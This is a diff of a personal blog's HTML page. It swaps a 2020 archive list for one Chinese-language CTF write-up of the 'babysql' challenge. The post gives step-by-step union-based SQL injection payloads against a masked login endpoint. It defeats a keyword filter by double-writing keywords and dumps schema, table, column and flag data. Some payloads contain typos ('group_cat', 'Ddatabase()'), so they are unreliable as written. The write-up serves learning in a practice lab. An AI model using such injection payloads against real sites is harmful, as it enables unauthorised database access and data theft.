@@ -47,7 +47,7 @@
 
     <!-- Title -->
     
-    <title>Archives: 2020 - Rejeta&#39;s Blog</title>
+    <title>Rejeta&#39;s Blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -136,9 +136,7 @@
 <div class="container">
 
     <!-- Main Content -->
-    
-
-<div class="row">
+    <div class="row">
     <div class="col-sm-12">
 
         <!--Title and Logo-->
@@ -146,223 +144,65 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">2020</h1>
-        
     </div>
 </header>
 
-        <section class="main archive-container">
+        <section class="main">
             
-                <div class="archive-post">
-    <a href="/2020/11/16/hello-world/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Hello World
-    </a>
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20babysql/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-11-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="极客大挑战-babysql"><a href="#极客大挑战-babysql" class="headerlink" title="极客大挑战 babysql"></a>极客大挑战 babysql</h1><p>启动靶机，进入题目。很明显的sql注入，因为题目已经提示了，那么就先找注入点。<br>类似于之前的easysql，先尝试username的地方是否有注入，发现只要注释掉了后面的password，那么网页会报错，只能在password的地方进行注入<br>首先，尝试通用的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F; ******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p>但是返回了一个数据库报错，报错显示，能到达数据库被识别的语句部分只有1,2,3<br>看来是对union select等词语进行了过滤，直接变成了空白字符<br>尝试双写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F; ******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>OK,页面成功返回，那就说明双写是有效的，接下来就是正常操作了，只不过多加了一个双写<br>查询数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(schema_name) frfromom infoorrmation_schema.schemata --+</span><br></pre></td></tr></table></figure>
+
+<p>查询数据表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema Ddatabase() --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/jkdtz_babysql_1.png"><br>查询字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema Ddatabase() anandd table_name&#x3D;&#39;b4bsql&#39;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://diviad-nick.github.io/image/jkdtz_babysql_2.png"><br>查询flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: http:&#x2F;&#x2F;******&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;1&#39; ununionion selselectect 1,2,group_cat(password) frfromom b4bsql --+</span><br></pre></td></tr></table></figure>
+<p>拿到flag<br><img src="https://diviad-nick.github.io/image/jkdtz_babysql_3.png"></p>
+
+    </div>
+
+    
+
+    
+
+    <!-- Comments -->
+    
+
 </div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/easyphp/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%20%E9%80%9A%E5%85%B3%EF%BC%88sql-5%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3(sql-1)/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%EF%BC%88sql-11%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5%EF%BC%88sql-12%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-2%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-3%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-7%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-4%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-6%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-labs%E9%80%9A%E5%85%B3%EF%BC%88sql-8~10%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Buyflag/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/sql-lab%E9%80%9A%E5%85%B3%EF%BC%88sql-13%EF%BC%89/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Knife1/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20babysql/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20easysql/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20havefun/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20https/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20lovesql/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20secret%20file/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
-                <div class="archive-post">
-    <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20upload/">
-        <span class="archive-date">
-            Nov 2020
-        </span>
-        Untitled
-    </a>
-</div>
-            
         </section>
+
     </div>
 </div>
+
 
 </div>
 
